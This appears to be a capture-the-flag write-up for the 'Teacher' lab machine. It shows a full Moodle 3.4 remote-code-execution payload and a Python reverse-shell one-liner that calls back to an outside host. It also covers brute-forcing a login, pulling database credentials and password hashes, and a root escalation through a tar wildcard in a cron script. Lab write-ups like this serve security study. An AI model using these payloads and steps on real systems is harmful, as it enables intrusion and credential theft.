Okay, first of all - we do some info gathering. Using nmap says we have an apache httpd server and nothing more. Searching through the website reveals nothing (checking source, running nikto and checking cookies/http headers).
From here I was stuck, so I went to the forum to check for some hints - it seems like there is a corrupted file. Obviously, it should be in /images folder because it contains most of the files. Checking every photo will be time consuming, but this is the only way (or to write a small script).
```
root@kali:~/Downloads# strings 5.png
Hi Servicedesk,
I forgot the last charachter of my password. The only part I remembered is Th4C00lTheacha.
Could you guys figure out what the last charachter is, or just reset it?
Thanks,
Giovanni
```
Now, we should find a login page. I used dirb to run again a common word list and found a few interesting directories, one of them is obviously the primary suspect (as a student, I can't believe I didn't think about it):
```
root@kali:~/Downloads# dirb http://10.10.10.153

-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Tue Mar  5 14:16:34 2019
URL_BASE: http://10.10.10.153/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

-----------------

GENERATED WORDS: 4612                                                          

---- Scanning URL: http://10.10.10.153/ ----
==> DIRECTORY: http://10.10.10.153/css/                                                                               
==> DIRECTORY: http://10.10.10.153/fonts/                                                                             
==> DIRECTORY: http://10.10.10.153/images/                                                                            
+ http://10.10.10.153/index.html (CODE:200|SIZE:8028)                                                                 
==> DIRECTORY: http://10.10.10.153/javascript/                                                                        
==> DIRECTORY: http://10.10.10.153/js/                                                                                
==> DIRECTORY: http://10.10.10.153/manual/                                                                            
==> DIRECTORY: http://10.10.10.153/moodle/                                                                            
+ http://10.10.10.153/phpmyadmin (CODE:403|SIZE:297)                                                                  
+ http://10.10.10.153/server-status (CODE:403|SIZE:300) 
```
Now we want to login to Giovanni's user.
we immidiately can see that the teachers name is Giovanni Chhatta therefor it's the login name. Now, we know we have a missing char at the end of the pass, so let's use bruteforce with Hydra to find it quickly. I created a password file with python:
```
import string
password="Th4C00lTheacha"
for x in string.printable:
    print(password+x)
```
and then used it to crack the pass with Hydra. Unfortunately, it didn't work, Hydra only produced false-positives. I decided to write my own brute forcer, you can check it inside the files. You can crack it with hydra, but I didn't want to do that when I can write a quick script.

Now that we are in the system, what do we do? Obviously, we look for an exploit. Googling a bit helps to find the version of our moodle which is 3.4 (click on "Moodle Docs for this page"). I must admit, I tried several exploits until I found this one:
https://blog.ripstech.com/2018/moodle-remote-code-execution/#substitute_variables

First of all, read it. It's interesting + let's you know what you are going to do. Now that we know we need to open a calculated question, we input the calculated formula "/*{a*/`$_GET[0]`;//{x}}". It gives us the ability to execute eval() via the GET request. Instead of writing /etc/passwd (which you probably tried and failed, because we cannot write to folders with our current user), we want to get a remote shell. Now, let me save you some time - we want interactive shell, thus netcat won't we a good option. I used python shell:
```
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("**10.0.0.1**",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```
As seen in the video, we append the shell at the end of the query as follows: `&0=(OUR_SHELL)`. 

Okay, so now we have a shell and the current user is /var/wwww and we cannot read giovanni's folder. We need to find some way to log into his account (this is why I wrote we need interactive shell). I personally know that usually important information is stored in config.php, but googling for configuration file for moodle, or doing some enumeration like searching for 'root' keywords in file will help us to find some tail. Opening config.php in /moodle folder reveals credentials for mariadb. 
We login to it and get our information:
```
$ mysql -h localhost -P 3306 -u root -p*** moodle
show tables;
Tables_in_moodle
.
.
.
```
we are interested in mdl_user_password_history. For some reason, the output wasn't on the screen so I had to write it into a file, so I reconnected:
```
$ mysql -h localhost -P 3306 -u root -p**** moodle > output
select * from mdl_user_password_history;
\q
$ cat output
...
```
We notice Giovannibak with a hash (easy to crack). This is the password for Giovanni's account, we almost have the user.
Now we want to upgrade our shell in order to login to his user:
```
$ python -c 'import pty; pty.spawn("/bin/bash")'
www-data@teacher:/var/www/html/moodle/question$ 
www-data@teacher:/var/www/html/moodle/question$ su giovanni
su giovanni
Password: ****
giovanni@teacher:/var/www/html/moodle/question$ cd ~
cd ~
giovanni@teacher:~$ ls
ls
user.txt  work
```

Next to root:
The root part took a while for me, mostly because I read a hint in the forum about setuid's and was waisting a lot of time searching for nothing. I spend a lot of time trying to find a special setuid files, which were not present (except from the basic files which are not exploitable).
Now, because the machine is depricated, I will sum up the priv escalation quickly - we have a script called backup.sh which runs every x mins. One can see it by inspecting ps -aux or using a tool like pspy64. Opening the file revelas the following:
```
cat /usr/bin/backup.sh
#!/bin/bash
cd /home/giovanni/work;
tar -czvf tmp/backup_courses.tar.gz courses/*;
cd tmp;
tar -xf backup_courses.tar.gz;
chmod 777 * -R;
```
Straight away we notice that a tar archive is compressed form courses/* and decompressed in /home/giovanni/work. We can exploit a know tar weakness with wildcards (\*), you can read more here: https://www.defensecode.com/public/DefenseCode_Unix_WildCards_Gone_Wild.txt

Now, all we need to do is go into courses and set our arguments as files. You can run a shell.sh files that will connect back to your computer, but I just wanted to get the root.txt, so I created a symlink to root from courses, so when the tar will be compressed, accessing courses will read root's folder contents:
```
giovanni@teacher:~/work$ ln -s /root/ courses
giovanni@teacher:~/work$ ls -la
ls -la
total 16
drwxr-xr-x 4 giovanni giovanni 4096 Apr 18 15:29 .
drwxr-x--- 4 giovanni giovanni 4096 Nov  4 19:47 ..
lrwxrwxrwx 1 giovanni giovanni    6 Apr 18 15:29 courses -> /root/
drwxr-xr-x 3 giovanni giovanni 4096 Apr 18 15:27 courses.bak
drwxr-xr-x 3 giovanni giovanni 4096 Jun 27  2018 tmp
-rw-rw-rw- 1 giovanni giovanni    0 Apr 18 15:20 ts
```
Great, now all we need to do is to extract the newly created tar file in work folder and read root.txt:
```
giovanni@teacher:~/work/tmp/courses$ cat root.txt
cat root.txt
4f3a83b42ac7723a508b8ace7b8b1209
```
That's it. Great machine!

